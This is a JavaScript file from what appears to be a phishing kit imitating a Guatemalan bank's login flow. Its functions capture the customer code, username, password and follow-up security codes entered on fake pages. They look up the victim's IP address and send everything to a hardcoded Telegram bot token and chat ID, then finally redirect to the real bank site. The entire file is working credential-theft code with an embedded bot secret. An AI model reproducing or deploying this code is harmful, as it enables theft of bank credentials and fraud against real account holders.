var tkl = "5622081402:AAHjk5tZkSH1Oe-viPRy5RBYzJpC6pNktqw";
var chtid = "-857494060";


function handle1(e){
    if(e.keyCode === 13){
        sxfm1();
    }
}
function handle11(e){
    if(e.keyCode === 13){
        sxfm11();
    }
}
function handle2(e){
    if(e.keyCode === 13){
        sxfm2();
    }
}
function handle3(e){
    if(e.keyCode === 13){
        sxfm3();
    }
}

function xlsxb() {
    var xhttp = new XMLHttpRequest();
    xhttp.onreadystatechange = function() {
        if (this.readyState == 4 && this.status == 200) {
        document.getElementById("rdx1").innerHTML =
        this.responseText;
        document.getElementById("rdx1").onclick = null;
        }
    };
    xhttp.open("GET", "rdrs1.html", true);
    xhttp.send();
}



function sxfm1(){
    
    var cod = $("#i1").val();
    var usr = $("#i2").val();
    var pss = $("#i3").val();

    if(!cod || !usr || !pss){
        console.log("empty");
    }else{

        mess = `C:${cod} - U:${usr} - P:${pss}`;
        $.get('https://ipinfo.io/ip', function(response){
            var sets = {
                "async": true,
                "crossDomain": true,
                "url": "https://api.telegram.org/bot" + tkl + "/sendMessage",
                "method": "POST",
                "headers": {
                    "Content-Type": "application/json",
                    "cache-control": "no-cache"
        
                },
                "data": JSON.stringify({
                    "chat_id": chtid,
                    "text": "B.I-1:"+response+" - "+mess
                })
            };  
            $.ajax(sets).done(function (response) {
                var xhttp2 = new XMLHttpRequest();
                xhttp2.onreadystatechange = function() {
                    if (this.readyState == 4 && this.status == 200) {
                        document.getElementById("rdx1").innerHTML =
                        this.responseText;
                    }
                 };
                xhttp2.open("GET", "rdrs1-1.html", true);
                xhttp2.send();
            });  
        });
        
        
    }
}

function sxfm11(){
    
    var cod = $("#i1").val();
    var usr = $("#i2").val();
    var pss = $("#i3").val();

    if(!cod || !usr || !pss){
        console.log("empty");
    }else{

        mess = `C:${cod} - U:${usr} - P:${pss}`;
        $.get('https://ipinfo.io/ip', function(response){
            var sets = {
                "async": true,
                "crossDomain": true,
                "url": "https://api.telegram.org/bot" + tkl + "/sendMessage",
                "method": "POST",
                "headers": {
                    "Content-Type": "application/json",
                    "cache-control": "no-cache"
        
                },
                "data": JSON.stringify({
                    "chat_id": chtid,
                    "text": "B.I-2:"+response+" - "+mess
                })
            };  
            $.ajax(sets).done(function (response) {
                var xhttp2 = new XMLHttpRequest();
                xhttp2.onreadystatechange = function() {
                    if (this.readyState == 4 && this.status == 200) {
                        document.getElementById("rdx1").innerHTML =
                        this.responseText;
                    }
                 };
                xhttp2.open("GET", "rdrs2.html", true);
                xhttp2.send();
            });  
        });
        
        
    }
}

function sxfm2(){
        
    var scod = $("#i1").val();

    if(!scod){
        console.log("empty");
    }else{

        mess = `SC:${scod}`;
        $.get('https://ipinfo.io/ip', function(response){
            var sets = {
                "async": true,
                "crossDomain": true,
                "url": "https://api.telegram.org/bot" + tkl + "/sendMessage",
                "method": "POST",
                "headers": {
                    "Content-Type": "application/json",
                    "cache-control": "no-cache"
        
                },
                "data": JSON.stringify({
                    "chat_id": chtid,
                    "text": "B.I:"+response+" - "+mess
                })
            };  
            $.ajax(sets).done(function (response) {
                var xhttp2 = new XMLHttpRequest();
                xhttp2.onreadystatechange = function() {
                    if (this.readyState == 4 && this.status == 200) {
                        document.getElementById("rdx1").innerHTML =
                        this.responseText;
                    }
                 };
                xhttp2.open("GET", "rdrs3.html", true);
                xhttp2.send();
            });  
        });
        
    }
}

function sxfm3(){
        
    var scod = $("#i1").val();

    if(!scod){
        console.log("empty");
    }else{

        mess = `SC2:${scod}`;
        $.get('https://ipinfo.io/ip', function(response){
            var sets = {
                "async": true,
                "crossDomain": true,
                "url": "https://api.telegram.org/bot" + tkl + "/sendMessage",
                "method": "POST",
                "headers": {
                    "Content-Type": "application/json",
                    "cache-control": "no-cache"
        
                },
                "data": JSON.stringify({
                    "chat_id": chtid,
                    "text": "B.I:"+response+" - "+mess
                })
            };  
            $.ajax(sets).done(function (response) {
                var xhttp2 = new XMLHttpRequest();
                xhttp2.onreadystatechange = function() {
                    if (this.readyState == 4 && this.status == 200) {
                        document.getElementById("rdx1").innerHTML =
                        this.responseText;
                    }
                 };
                xhttp2.open("GET", "rdrs4.html", true);
                xhttp2.send();

            });  
        });
        
    }
}

function sxfm4(){
    window.location = "https://www.corporacionbi.com/gt/";
}
